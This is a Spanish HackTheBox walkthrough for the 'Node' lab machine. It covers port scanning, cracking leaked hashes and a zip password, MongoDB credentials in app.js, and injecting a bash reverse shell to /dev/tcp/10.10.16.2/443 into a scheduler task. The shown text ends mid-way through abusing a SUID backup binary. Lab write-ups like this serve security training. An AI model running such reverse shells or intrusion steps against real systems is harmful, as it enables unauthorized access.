<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<link rel="icon" href="/assets/images/piece.png">

<title>Firtsmiracle Blog de Ciberseguridad</title>

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Maquina Node - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="Maquina Node - htb writeup" />
<meta name="author" content="Firtsmiracle" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="El dia de hoy vamos a resolver Node de hackthebox una maquina linux de dificultad media, para poder comprometer la maquina nos aprovecharemos la informacion lekeada del servicio expuesta en la api que nos otorgara credenciales para conectarnos al servicio, donde descargaremos un backup comprimido con información para poder ingresar al sistema, despues aprovecharemos de una inyeccion a una task de mongodb donde a traves de un campo obtendremos ejecución remota de comandos rce y finalmente mediante un binario suid podremos leeer la flag del usuario root. Ademas alternivamente vamos a ganar acceso al sistema explotando un buffer overflow en el binario suid a traves de ret2libc y ganando acceso al sistema como el usuario root. Esta maquina es divertida asi que a darle!." />
<meta property="og:description" content="El dia de hoy vamos a resolver Node de hackthebox una maquina linux de dificultad media, para poder comprometer la maquina nos aprovecharemos la informacion lekeada del servicio expuesta en la api que nos otorgara credenciales para conectarnos al servicio, donde descargaremos un backup comprimido con información para poder ingresar al sistema, despues aprovecharemos de una inyeccion a una task de mongodb donde a traves de un campo obtendremos ejecución remota de comandos rce y finalmente mediante un binario suid podremos leeer la flag del usuario root. Ademas alternivamente vamos a ganar acceso al sistema explotando un buffer overflow en el binario suid a traves de ret2libc y ganando acceso al sistema como el usuario root. Esta maquina es divertida asi que a darle!." />
<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Node" />
<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Node" />
<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Node/node.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-07-17T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Node/node.png" />
<meta property="twitter:title" content="Maquina Node - htb writeup" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-07-17T00:00:00+00:00","datePublished":"2023-07-17T00:00:00+00:00","description":"El dia de hoy vamos a resolver Node de hackthebox una maquina linux de dificultad media, para poder comprometer la maquina nos aprovecharemos la informacion lekeada del servicio expuesta en la api que nos otorgara credenciales para conectarnos al servicio, donde descargaremos un backup comprimido con información para poder ingresar al sistema, despues aprovecharemos de una inyeccion a una task de mongodb donde a traves de un campo obtendremos ejecución remota de comandos rce y finalmente mediante un binario suid podremos leeer la flag del usuario root. Ademas alternivamente vamos a ganar acceso al sistema explotando un buffer overflow en el binario suid a traves de ret2libc y ganando acceso al sistema como el usuario root. Esta maquina es divertida asi que a darle!.","headline":"Maquina Node - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Node/node.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Node"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Node"}</script>
<!-- End Jekyll SEO tag -->


<!-- CSS -->
<link href="/assets/css/prism.css" rel="stylesheet">
<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
<link href="/assets/css/theme.css" rel="stylesheet">
<link href="/assets/css/modal.css" rel="stylesheet">

<script src="/assets/js/jquery.min.js"></script>

</head>




<body>
	<!-- defer loading of font and font awesome -->
	<noscript id="deferred-styles">
		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
	</noscript>


<!-- Begin Sidebar Navigation
================================================== -->

<div class="sidebar">    
</div>   
<div class="nav-icon">
    <div class="hamburger-bar"></div>
</div>
<div id="blackover-nav" class="blackover"></div>
<nav id="menu">
    <ul>
        <h2>BLog de Ciberseguridad</h2><br><br>
        <li><a href="/" id="menu-home">Inicio</a></li>
        <li><a href="/categories#articulos">Artículos</a></li>
        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
        <li><a href="/tags">Tags</a></li>
        <li><a href="/about" id="menu-aboutme">Información</a></li>
    </ul>   
</nav>

<script src="/assets/js/lunr.js"></script>

<style>
    
</style>

<div class="wrap-search">
    <div class="d-flex align-items-center ml-auto">
        <i class="fas fa-search show-search"></i>
        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
        </form>
    </div>
</div>

<div id="lunrsearchresults">
    <ul></ul>
</div>

<script src="/assets/js/lunrsearchengine.js"></script>



<!-- End Sidebar Navigation
================================================== -->

<div class="site-content ">

<div class="container">

    <!-- Site Logo/Name
    ================================================== -->
   
    <a class="navbar-brand" href="/">
        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
    </a>  
   

    <!-- Site Tag
    ================================================== -->
    

    <!-- Content
    ================================================== -->
    <div class="main-content">
        <script defer src="/assets/js/lightbox.js"></script>

<div class="entry-header">
    <!-- Post Title -->
    <h1 class="posttitle">Maquina Node - htb writeup</h1>
    <!-- Author & Date  Box -->
    
    
    <div class="d-flex align-items-center mt-4">
        <div>
            
            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
            
        </div>            
        <div>
        Firtmiracle <a targ="_blank" class="text-info"></a> el 
        <span class="post-date"><time class="post-date" datetime="2023-07-17">17 Jul 2023</time></span>           
        
        </div>            
    </div>
    
</div>

<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->


<!-- Featured Image -->

<div class="entry-featured-image">
    
    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Node/node.png" alt="Maquina Node - htb writeup">
    
</div>


<!-- Content -->
<!-- Post, Page Content
================================================== -->
<div class="article-post">
    <!-- Toc if any -->
    
    <!-- End Toc -->
    <p>El dia de hoy vamos a resolver <code>Node</code> de <code>hackthebox</code> una maquina <code>linux</code> de dificultad media, para poder comprometer la maquina nos aprovecharemos la informacion lekeada del servicio expuesta en la <code>api</code> que nos otorgara credenciales para conectarnos al servicio, donde descargaremos un backup comprimido con información para poder ingresar al sistema, despues aprovecharemos de una inyeccion a una task de <code>mongodb</code> donde a traves de un campo obtendremos ejecución remota de comandos <code>rce</code> y finalmente mediante un binario <code>suid</code> podremos leeer la flag del usuario <code>root</code>. Ademas alternivamente vamos a ganar acceso al sistema explotando un <code>buffer overflow</code> en el binario <code>suid</code> a traves de <code>ret2libc</code> y ganando acceso al sistema como el usuario <code>root</code>.</p>

<p>Esta maquina es divertida asi que a darle!.</p>

<p>Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:</p>

<pre><code class="language-bash">❯ mkdir Node
❯ ls:w

 Node
</code></pre>
<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>

<pre><code class="language-bash">❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
</code></pre>

<h2 id="enumeracion">ENUMERACION <a href="#enumeracion">#</a></h2>

<p>Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>

<pre><code class="language-bash">❯ ping -c 1 10.10.10.58
PING 10.10.10.58 (10.10.10.58) 56(84) bytes of data.
64 bytes from 10.10.10.58: icmp_seq=1 ttl=63 time=109 ms

--- 10.10.10.58 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.550/108.550/108.550/0.000 ms
</code></pre>
<p>Vemos que la maquina nos responde, con un ttl de <code>63</code> y por proximidad seria correspondiente a una maquina <code>linux</code>.</p>

<h3 id="escaneo-de-puertos">ESCANEO DE PUERTOS</h3>

<table>
  <thead>
    <tr>
      <th>Parámetro</th>
      <th style="text-align: left">Descripción</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><a href="#enumeracion">-p-</a></td>
      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
    </tr>
    <tr>
      <td><a href="#enumeracion">–open</a></td>
      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
    </tr>
    <tr>
      <td><a href="#enumeracion">-v</a></td>
      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
    </tr>
    <tr>
      <td><a href="#enumeracion">-oG</a></td>
      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
    </tr>
  </tbody>
</table>

<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>

<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.58 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-17 22:25 GMT
Initiating SYN Stealth Scan at 22:25
Scanning 10.10.10.58 [65535 ports]
Discovered open port 22/tcp on 10.10.10.58
Discovered open port 3000/tcp on 10.10.10.58
Completed SYN Stealth Scan at 22:25, 26.41s elapsed (65535 total ports)
Nmap scan report for 10.10.10.58
Host is up, received user-set (0.11s latency).
Scanned at 2023-07-17 22:25:27 GMT for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 20 (880B)
</code></pre>

<h3 id="escaneo-de-version-y-servicios">ESCANEO DE VERSION Y SERVICIOS</h3>

<pre><code class="language-java">❯ nmap -sCV -p22,3000 10.10.10.58 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-17 22:26 GMT
Nmap scan report for 10.10.10.58
Host is up (0.12s latency).

PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
|_http-title: MyPlace
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.44 seconds
</code></pre>

<p>Visulizamos información interesante de los puertos escaneados:</p>

<table>
  <thead>
    <tr>
      <th>Puerto</th>
      <th>Servicio</th>
      <th>Versión</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>22</td>
      <td>SSH</td>
      <td>OpenSSH 7.2p2</td>
    </tr>
    <tr>
      <td>80</td>
      <td>HTTP</td>
      <td>hadoop-tasktracker</td>
    </tr>
  </tbody>
</table>

<h2 id="explotación">EXPLOTACION <a href="#explotación">#</a></h2>

<p>Comenzamos usando <code>whatweb</code>, para determinar las tecnologias que esta usando el servicio web.</p>

<pre><code class="language-bash">❯ whatweb http://10.10.10.58:3000
http://10.10.10.58:3000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.10.58], JQuery, Script[text/javascript], Title[MyPlace], X-Powered-By[Express], X-UA-Compatible[IE=edge]
</code></pre>

<p>La herramienta nos reporta que se trata de un <code>Express</code>, lo que quiere decir que en el backend esta corriendo <code>NodeJS</code>.</p>

<p>Vamos a proceder a abrir el servicio con el navegador para visualizar el servicio.</p>

<p><img src="/assets/images/HTB/htb-writeup-Node/node1.PNG" alt="" /></p>

<p>Vemos que existe una opcion de login para acceder al servicio.</p>

<p><img src="/assets/images/HTB/htb-writeup-Node/node2.PNG" alt="" /></p>

<p>Ahora ya que sabemos que por dentro corre un <code>nodejs</code>, para evitar aplicar fuzzing, podemos usar el depurador, para poder ver rutas por defecto del servicio tipo <code>app</code>. Y dentro descubrimos una ruta de usuarios.</p>

<p><img src="/assets/images/HTB/htb-writeup-Node/node3.PNG" alt="" /></p>

<p>Si tratamos de acceder a la ruta, vemos que podemos listar el contenido de usuarios con sus respectivas contraseñas hasheadas.</p>

<p><img src="/assets/images/HTB/htb-writeup-Node/node4.PNG" alt="" /></p>

<p>Procedemos a crackear las contraseñas para ello usaremos nuestra web de confianza.</p>

<ul>
  <li><a href="https://crackstation.net/">https://crackstation.net/</a></li>
</ul>

<p>y Obtenemos contraseñas en texto claro.</p>

<p><img src="/assets/images/HTB/htb-writeup-Node/node5.PNG" alt="" /></p>

<p>La exportamos al fichero de nombre <code>users.txt</code> y procedemos a logearnos al servicio.</p>

<pre><code class="language-bash">❯ cat users.txt
myP14ceAdm1nAcc0uNT:manchester
tom:spongebob
mark:snowflake
</code></pre>

<p>Al conectarnos vemos una opción de <code>DownloadBackup</code>, asi que lo descargamos y hacemos un decode del contenido que esta en <code>base64</code> y lo exportamos con el nombre de <code>backup</code>.</p>

<p><img src="/assets/images/HTB/htb-writeup-Node/node6.PNG" alt="" /></p>

<pre><code class="language-bash">❯ cat myplace.backup | base64 -d &gt; backup
❯ cat backup
❯ file backup
backup: Zip archive data, at least v1.0 to extract
</code></pre>

<p>Como resultado obtenemos un comprimido protegido por contraseña.</p>

<pre><code class="language-bash">❯ unzip backup
Archive:  backup
   creating: var/www/myplace/
[backup] var/www/myplace/package-lock.json password
</code></pre>

<p>Usaremos <code>fcrackzip</code> y obtenemos la contraeña del comprimido.</p>

<pre><code class="language-bash">❯ fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt backup


PASSWORD FOUND!!!!: pw == magicword
</code></pre>

<p>Dentro observamos bastante contenido, pero al tratarse de un <code>node.js</code>, podemos tratar de grepear por archivos como <code>app.js</code>, donde podemos encontrar informacion interesante.</p>

<pre><code class="language-bash">❯ find . | grep app.js
./www/myplace/app.js
./www/myplace/static/assets/js/app/app.js
</code></pre>

<p>Abrimos el archivo <code>app.js</code> y encontramos unas credenciales del servicio mongodb, correspondientes al usuario <code>mark</code>.</p>

<p><img src="/assets/images/HTB/htb-writeup-Node/node7.PNG" alt="" /></p>

<p>Como vimos que el servicio <code>ssh</code> se encuentra activo, podemos tratar de conectarnos con las nuevas credenciales.</p>

<pre><code class="language-bash">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3

              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Jul 18 00:34:52 2023 from 10.10.16.2
mark@node:~$ 
</code></pre>

<p>Ahora que ganamos acceso al sistema como el usuario <code>mark</code>, listamos los servicios activos y vemos el puerto <code>27017</code>, correspondiente a <code>MongoDB</code>.</p>

<pre><code class="language-bash">mark@node:~$ ss -nltp
State       Recv-Q Send-Q                 Local Address:Port                    Peer Address:Port      
LISTEN      0      128                     127.0.0.1:27017                              *:*            
LISTEN      0      128                          *:22                                    *:*       
LISTEN      0      128                        :::3000                                   :::*           
</code></pre>

<p>Si ahora listamos los procesos del sistema vemos que se esta corriendo otro <code>app.js</code> correspondiente a un <code>scheduller</code>.</p>

<pre><code class="language-bash">mark@node:~$ ps -faux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    Jul17   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    Jul17   0:00  \_ [ksoftirqd/0]
mongodb   1237  0.6 11.8 281952 89772 ?        Ssl  Jul17   0:36 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
tom       1240  0.0  5.5 1008568 42148 ?       Ssl  Jul17   0:02 /usr/bin/node /var/scheduler/app.js
tom       1243  0.0  9.0 1041968 68560 ?       Ssl  Jul17   0:03 /usr/bin/node /var/www/myplace/app.js
</code></pre>

<p>Si visualizamos el archivo obtenemos otras credenciales correspondientes a mongo.</p>

<pre><code class="language-js">mark@node:~$ cat /var/scheduler/app.js
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error &amp;&amp; docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
</code></pre>

<p>Nos conectamos la servicio con las nuevas credenciales obtenidas, listamos las colecciones de la base de datos.</p>

<pre><code class="language-bash">mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
&gt; show collections
tasks
</code></pre>

<p>En la colección <code>tasks</code>, vamos a usar <code>db.task.find()</code> tal y como vemos en el script <code>app.js</code> para realizar consultas en la colección <code>tasks</code>.</p>

<pre><code class="language-bash">&gt; db.tasks.find()
&gt; 
</code></pre>

<p>La consulta no nos lista nada, pero si volvemos a revisar <code>app.js</code> obervamos <code>exec(doc.cmd);</code> que se esta validando el uso de un campo llamado <code>cmd</code>, asi que podriamos tratar de  insertar un nuevo documento con <code>db.tasks.insert()</code> incorporando el <code>cmd</code> y ejecutando un comando aprovechandonos de la función <code>exec</code>y asi otorgarnos una <code>revershell</code>.</p>

<pre><code class="language-bash">&gt; db.tasks.insert({"cmd": "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.2/443 0&gt;&amp;1'"})
WriteResult({ "nInserted" : 1 })
&gt; db.tasks.find()
{ "_id" : ObjectId("64b5d7e418c6053c65dd5030"), "cmd" : "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.2/443 0&gt;&amp;1'" }
</code></pre>

<p>Ahora nos ponemos en escucha en nuestra equipo y recibimos la conexión como el usuario <code>tom</code>.</p>

<pre><code class="language-bash">❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.58.
Ncat: Connection from 10.10.10.58:44564.
bash: cannot set terminal process group (1240): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
See "man sudo_root" for details.

tom@node:/$ whoami
whoami
tom
</code></pre>

<p>Ahora podemos dirigirnos al directorio personal del usuario y visualizar la primera flag <code>user.txt</code>.</p>

<pre><code class="language-bash">tom@node:/$ cd /home/tom
cd /home/tom
tom@node:~$ cat user.txt
cat user.txt
4452fba153c742ca44fd79aac0f934c9
</code></pre>
<h2 id="escalada-de-privilegios">ELEVACION DE PRIVILEGIOS <a href="#escalada-de-privilegios">#</a></h2>

<p>Listando los binarios con privilegios <code>suid</code>, encontramos uno inusual llamando <code>backup</code>.</p>

<pre><code class="language-bash">tom@node:/$ find / -perm -4000 2&gt;/dev/null
find / -perm -4000 2&gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/local/bin/backup
/usr/bin/chfn
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/bin/ping
/bin/umount
/bin/fusermount
/bin/ping6
/bin/ntfs-3g
/bin/su
/bin/mount
</code></pre>

<p>Si tratamos de ejecutar el binario, vemos que no sucede nada.</p>

<pre><code class="language-bash">tom@node:/$ /usr/local/bin/backup
/usr/local/bin/backup
tom@node:/$
</code></pre>

<p>Pero si volvemos a visualizar el <code>app.js</code> que listamos al principio el cual estaba contenido en el comprimido, observamos una ruta correspondiente a <code>backup</code> la cual se ejecuta con 3 parametros, entre ellos una key y un directorio.</p>

<p><img src="/assets/images/HTB/htb-writeup-Node/node8.PNG" alt="" /></p>

<p>Probamos nuevamente a ejecutarlo con 3 parametros.</p>

<pre><code class="language-bash">om@node:/$ /usr/local/bin/backup a a a
/usr/local/bin/backup a a a



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [!] Ah-ah-ah! You didn't say the magic word!


tom@node:/$
</code></pre>

<p>Vemos que esta vez funciona, pero ahora usaremos ltrace para ver a bajo nivel el proceso de lo que sucede al ejecutar el binario.</p>

<pre><code class="language-bash">tom@node:/$ ltrace /usr/local/bin/backup a b c
ltrace /usr/local/bin/backup a b c
strncpy(0xffef6578, "b", 100)                                                                                     = 0xffef6578
strcpy(0xffef6561, "/")                                                                                           = 0xffef6561
strcpy(0xffef656d, "/")                                                                                           = 0xffef656d
strcpy(0xffef64f7, "/e")                                                                                          = 0xffef64f7
strcat("/e", "tc")                                                                                                = "/etc"
strcat("/etc", "/m")                                                                                              = "/etc/m"
strcat("/etc/m", "yp")                                                                                            = "/etc/myp"
strcat("/etc/myp", "la")                                                                                          = "/etc/mypla"
strcat("/etc/mypla", "ce")                                                                                        = "/etc/myplace"
strcat("/etc/myplace", "/k")                                                                                      = "/etc/myplace/k"
strcat("/etc/myplace/k", "ey")                                                                                    = "/etc/myplace/key"
strcat("/etc/myplace/key", "s")                                                                                   = "/etc/myplace/keys"
fopen("/etc/myplace/keys", "r")                                                                                   = 0x8c06410
fgets("a01a6aa5aaf1d7729f35c8278daae30f"..., 1000, 0x8c06410)                                                     = 0xffef610f
strcspn("a01a6aa5aaf1d7729f35c8278daae30f"..., "\n")                                                              = 64
strcmp("b", "a01a6aa5aaf1d7729f35c8278daae30f"...)                                                                = 1
fgets("45fac180e9eee72f4fd2d9386ea7033e"..., 1000, 0x8c06410)                                                     = 0xffef610f
strcspn("45fac180e9eee72f4fd2d9386ea7033e"..., "\n")                                                              = 64
strcmp("b", "45fac180e9eee72f4fd2d9386ea7033e"...)                                                                = 1
fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x8c06410)                                                     = 0xffef610f
strcspn("3de811f4ab2b7543eaf45df611c2dd25"..., "\n")                                                              = 64
strcmp("b", "3de811f4ab2b7543eaf45df611c2dd25"...)                                                                = 1
fgets("\n", 1000, 0x8c06410)                                                                                      = 0xffef610f
strcspn("\n", "\n")                                                                                               = 0
strcmp("b", "")                                                                                                   = 1
fgets(nil, 1000, 0x8c06410)                                                                                       = 0
strcpy(0xffef5148, "Ah-ah-ah! You didn't say the mag"...)                                                         = 0xffef5148
printf(" %s[!]%s %s\n", "\033[33m", "\033[37m", "Ah-ah-ah! You didn't say the mag"... [!] Ah-ah-ah! You didn't say the magic word!
</code></pre>

<p>Observamos que compara el segundo campo <code>b</code> con una key de un archivo <code>/etc/myplace/keys</code> que si lo listamos podemos ver el contenido.</p>

<pre><code class="language-bash">tom@node:/$ cat /etc/myplace/keys
cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
</code></pre>

<p>Podemos usar una de las keys y como tercer parametro ya que nos pide ingresar un directorio, podriamos tratar de visualizar la flag de root.</p>

<pre><code class="language-bash">/usr/local/bin/backup a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [+] Validated access token
 [+] Starting archiving root
 [+] Finished! Encoded backup is below:

